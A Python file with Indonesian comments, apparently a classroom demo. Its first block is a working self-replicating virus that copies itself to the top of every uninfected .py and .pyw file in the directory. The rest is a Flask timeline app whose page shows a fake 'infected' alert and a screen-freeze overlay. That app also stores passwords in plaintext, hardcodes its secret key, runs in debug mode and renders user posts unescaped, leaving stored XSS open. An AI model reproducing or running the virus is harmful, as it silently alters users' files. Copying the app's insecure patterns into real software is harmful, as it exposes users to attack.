# VIRUS SAYS HI!
import sys
import glob

virus_code = []

# Virus membaca dirinya sendiri dari file yang sedang berjalan
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!\n": # Marker awal virus
        self_replicating_part = True
    if self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n": # Marker akhir virus
        break

# Mencari semua file python di direktori yang sama
python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    # Jika file belum terinfeksi, sisipkan kode virus di paling atas
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.append('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    # Ini aksi "jahat" virus di sisi server (terminal)
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()
# VIRUS SAYS BYE!

# -*- coding: utf-8 -*-
import os
import sqlite3
from flask import Flask, redirect, request, session
from jinja2 import Template

app = Flask(__name__)

app.secret_key = 'schrodinger cat'

DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')


def connect_db():
    return sqlite3.connect(DATABASE_PATH)


def create_tables():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username VARCHAR(32),
            password VARCHAR(32)
            )''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS time_line(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        content TEXT,
        FOREIGN KEY (`user_id`) REFERENCES `user`(`id`)
        )''')
    conn.commit()
    conn.close()


def init_data():
    users = [
        ('user1', '123456'),
        ('user2', '123456')
    ]
    lines = [
        (1, 'Hello'),
        (1, 'World'),
        (2, 'Im 2'),
        (2, 'Hello 2')
    ]
    conn = connect_db()
    cur = conn.cursor()
    cur.executemany('INSERT INTO `user` VALUES(NULL,?,?)', users)
    cur.executemany('INSERT INTO `time_line` VALUES(NULL,?,?)', lines)
    conn.commit()
    conn.close()


def init():
    create_tables()
    init_data()


def get_user_from_username_and_password(username, password):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, username FROM user WHERE username=? AND password=?', (username, password))
    row = cur.fetchone()
    conn.close()
    return {'id': row[0], 'username': row[1]} if row is not None else None


def get_user_from_id(uid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, username FROM user WHERE id=?', (uid,))
    row = cur.fetchone()
    conn.close()
    return {'id': row[0], 'username': row[1]} if row is not None else None


def create_time_line(uid, content):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('INSERT INTO time_line (id, user_id, content) VALUES (NULL, ?, ?)', (uid, content))
    conn.commit()
    conn.close()


def get_time_lines():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
    rows = cur.fetchall()
    conn.close()
    return [{'id': row[0], 'user_id': row[1], 'content': row[2]} for row in rows]


def user_delete_time_line_of_id(uid, tid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('DELETE FROM time_line WHERE user_id=? AND id=?', (uid, tid))
    conn.commit()
    conn.close()


def render_login_page():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #e9ecef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 250px; text-align: center; }
        input[type="text"], input[type="password"] { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
        input[type="submit"] { width: 100%; padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        input[type="submit"]:hover { background-color: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h3>System Login</h3>
        <form method="POST">
            <input name="username" type="text" placeholder="Username" required />
            <input name="password" type="password" placeholder="Password" required />
            <input value="Login" type="submit" />
        </form>
    </div>
</body>
</html>
    '''


def render_home_page(uid):
    user = get_user_from_id(uid)
    time_lines = get_time_lines()
    template = Template('''
<!DOCTYPE html>
<html>
<head>
    <title>Home</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; }
        .container { max-width: 500px; margin: 40px auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.1); }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #efefef; padding-bottom: 10px; margin-bottom: 20px; }
        .header a { text-decoration: none; color: #dc3545; font-weight: bold; }
        .input-group { display: flex; gap: 10px; margin-bottom: 20px; }
        .input-group input[type="text"] { flex: 1; padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
        .input-group input[type="submit"] { padding: 8px 15px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer; }
        ul { list-style: none; padding: 0; }
        li { background: #f9f9f9; margin-bottom: 10px; padding: 15px; border-radius: 4px; border-left: 4px solid #007bff; display: flex; justify-content: space-between; align-items: center;}
        li a { color: #dc3545; text-decoration: none; font-size: 0.9em; }
        
        /* CSS Untuk Freeze Layar */
        #freeze-overlay {
            display: none; 
            position: fixed; 
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(255, 0, 0, 0.15); /* Sedikit warna merah agar terkesan diretas */
            z-index: 9999; 
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div id="freeze-overlay"></div>

    <div class="container">
        <div class="header">
            <h4>Halo, {{ user['username'] }}!</h4>
            <a href="/logout">Logout</a>
        </div>
        
        <form id="virusForm" method="POST" action="/create_time_line">
            <div class="input-group">
                <input type="text" name="content" placeholder="Tulis sesuatu..." required />
                <input type="submit" value="Add" />
            </div>
        </form>

        <ul>
            {% for line in time_lines %}
            <li>
                <span>{{ line['content'] }}</span>
                {% if line['user_id'] == user['id'] %}
                <a href="/delete/time_line/{{ line['id'] }}">Hapus</a>
                {% endif %}
            </li>
            {% endfor %}
        </ul>
    </div>

    <script>
        document.getElementById('virusForm').addEventListener('submit', function(event) {
            // 1. Tahan form agar tidak langsung reload/pindah halaman
            event.preventDefault();
            
            // 2. Munculkan popup notifikasi
            alert("haaha youre infected");
            
            // 3. Aktifkan overlay pelindung layar agar web tidak bisa diklik
            const overlay = document.getElementById('freeze-overlay');
            overlay.style.display = 'block';
            
            // 4. Set timer 5 detik (5000 milidetik)
            setTimeout(function() {
                // Hilangkan overlay dan lanjutkan pengiriman data ke server
                overlay.style.display = 'none';
                event.target.submit();
            }, 5000);
        });
    </script>
</body>
</html>
    ''')
    return template.render(user=user, time_lines=time_lines)

@app.route('/init')
def init_page():
    init()
    return redirect('/')

@app.route('/')
def index():
    if 'uid' in session:
        return render_home_page(session['uid'])
    return redirect('/login')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_login_page()
    elif request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_user_from_username_and_password(username, password)
        if user is not None:
            session['uid'] = user['id']
            return redirect('/')
        else:
            return redirect('/login')


@app.route('/create_time_line', methods=['POST'])
def time_line():
    if 'uid' in session:
        uid = session['uid']
        create_time_line(uid, request.form['content'])
    return redirect('/')


@app.route('/delete/time_line/<tid>')
def delete_time_line(tid):
    if 'uid' in session:
        user_delete_time_line_of_id(session['uid'], tid)
    return redirect('/')


@app.route('/logout')
def logout():
    if 'uid' in session:
        session.pop('uid')
    return redirect('/login')


if __name__ == '__main__':
    app.run(debug=True)